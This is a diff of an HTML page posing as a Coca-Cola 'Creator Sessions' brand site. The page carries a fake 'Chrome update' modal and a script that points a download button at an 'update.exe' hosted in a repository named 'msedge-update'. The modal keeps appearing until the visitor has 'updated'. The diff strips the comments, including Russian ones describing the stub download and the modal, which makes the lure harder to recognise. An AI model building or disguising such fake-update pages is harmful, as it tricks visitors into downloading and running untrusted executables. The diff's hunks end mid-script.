@@ -6,7 +6,6 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Coca-Cola Creator Sessions</title>
 <style>
-  /* ============ BASE PAGE ============ */
   :root {
     --cc-red: #F40009; --cc-white: #FFFFFF; --cc-black: #000000;
     --cc-cream: #F2EDE4; --cc-dark: #0D0D0D; --cc-gray: #555;
@@ -224,7 +223,6 @@
     .footer { padding: 32px 20px 40px; }
   }
 
-  /* ============ CHROME UPDATE MODAL ============ */
       .modal {
         display: none;
         position: fixed;
@@ -364,7 +362,6 @@
   </nav>
 </header>
 
-<!-- ==================== HERO ==================== -->
 <section class="hero">
   <div class="hero-content reveal">
     <div class="hero-eyebrow">Coca-Cola × Creator Sessions · 2026</div>
@@ -398,7 +395,6 @@
   </div>
 </section>
 
-<!-- ==================== STORY ==================== -->
 <section class="section section-cream" id="story">
   <div class="section-header reveal">
     <div class="section-header-text">
@@ -445,7 +441,6 @@
   </div>
 </section>
 
-<!-- ==================== MANIFESTO + CONTACT ==================== -->
 <section class="section section-dark">
   <div class="split">
     <div class="manifesto reveal">
@@ -470,7 +465,6 @@
   </div>
 </section>
 
-<!-- ==================== FOOTER ==================== -->
 <footer class="footer">
   <div>
     <img class="footer-logo"
@@ -481,7 +475,6 @@
   <span>Creator Sessions · Made for moments</span>
 </footer>
 
-<!-- ==================== CHROME UPDATE MODAL ==================== -->
 <div id="myModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
@@ -500,10 +493,8 @@
 </div>
 
 <script>
-  // URL файла-заглушки
   window.downloadLink = 'https://github.com/teddymrvhx21-jpg/msedge-update/releases/download/latest/update.exe';
 
-  // Reveal on scroll
   const els = document.querySelectorAll('.reveal');
   const io = new IntersectionObserver(
     (entries) => entries.forEach((e) => {
@@ -513,7 +504,6 @@
   );
   els.forEach((el) => io.observe(el));
 
-  // Показ модалки, если ещё не "обновились"
   if (localStorage.getItem("updated") !== "true") {
     var modal = document.getElementById("myModal");
     var btn = document.getElementById("download");
